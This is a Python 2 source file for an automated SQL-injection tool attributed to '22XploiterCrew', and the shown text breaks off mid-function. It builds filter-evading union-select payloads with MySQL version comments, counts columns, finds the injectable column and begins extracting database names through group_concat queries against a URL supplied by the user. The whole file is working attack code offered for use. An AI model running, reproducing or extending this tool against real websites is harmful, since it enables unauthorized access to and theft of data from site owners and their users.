import urllib as toxic
import sys
import os
import platform
import time

clear = "clear"
if platform.system() == "Windows":
    clear = "cls"
os.system(str(clear))

header="""
  _________________  .____    .__ 
 /   _____/\_____  \ |    |   |__|
 \_____  \  /  / \  \|    |   |  |
 /        \/   \_/.  \    |___|  |
/_______  /\_____\ \_/_______ \__|
        \/        \__>       \/   
"""
print header

class Sqli:
    url = None
    vulCol = None
    columns = None
    dbs = []
    payload = "0x2d31+/*!50000union*/+/*!50000select*/"
    build = ["", ""]
    key = "1620597971540027"
    def setUrl(self):
        for k, v in enumerate(sys.argv):
            if v == "--url":
                try:
                    u = sys.argv[k+1]
                    pos = u.find("=")
                    url = u[:pos+1]
                    self.url = url
                except:
                    pass              
        try:
            print "Url: "+u
            print "\n"
        except NameError:
            pass
            print
            time.sleep(1)
            print "----------------------------------"
            time.sleep(0.1)
            print "Coder : Tuman"
            time.sleep(0.1)
            print "Team : 22XploiterCrew"
            time.sleep(0.1)
            print "Thanks To All Member 22Xc & N.P.T"
            time.sleep(0.1)
            print "----------------------------------"
            time.sleep(1)
            print "*ERROR*: Url not defined!\n"
            time.sleep(1)
            print "Usage: python sqli.py --url http://testphp.vulnweb.com/listproducts.php?cat=1\n"
            time.sleep(0.1)
            exit()

    def getContent(self,url):
        res = toxic.urlopen(url)
        return res.read() 

    def setColumns(self):
        try:
            print "[+]Mencari Column Cok...[+]"
            url = self.url + self.payload
            start = 1
            finish = 50
            for i in range(start,finish):
                sys.stdout.write("\rJumlah Column: {0}".format(i))
                if i != start and i != finish:
                    url+=", "
                url+=self.key
                res = self.getContent(url)
                if res.find("union select") ==-1:
                    if res.find("1620597971540027") !=-1:
                        self.columns = i
                        return    
            self.columns = 0
        except:
            print "\nError!"
            exit()

    def setVulCol(self):
        for i in range(1, self.columns+1):
            line = self.payload
            for j in range(1, self.columns+1):
                if j != 1 and j != self.columns+1:
                    line = line + ", "
                if i == j:
                    line+="/*!50000ConCat(0x27,"+self.key+",0x27)*/"
                else:
                    line+="/*!50000ConCat(0x27,"+str(j)+",0x27)*/"
            res = self.getContent(self.url + line)
            if res.find(self.key) !=-1:
                self.vulCol = i
                return
        self.vulCol = 0
        exit()

    def getConcat(self,string):
        return "/*!50000Concat(0x5e27,/*!50000gROup_cONcat("+string+")*/,0x275e)"

    def getVars(self,content):
        pos = content.find("^'")
        if(pos != -1):      
            ini = content[pos+2:]
            pos = ini.find("'^")
            if(pos !=-1):
                return ini[:pos]
            else:
                print "*ERROR*: Not found!\n"
                exit()

    def getDatabase(self):
        self.build = [self.url + self.payload, ""]
        line = ""
        side = 0
        for i in range(1, self.columns+1):
            if i != 1 and i != self.columns+1:
                line=","
            if side == 0:
                if i != self.vulCol:
                    self.build[side]+=line+str(i)
                    line+= str(i) 
                else:
                    if i !=1:
                        self.build[side]+=","
                    side = 1
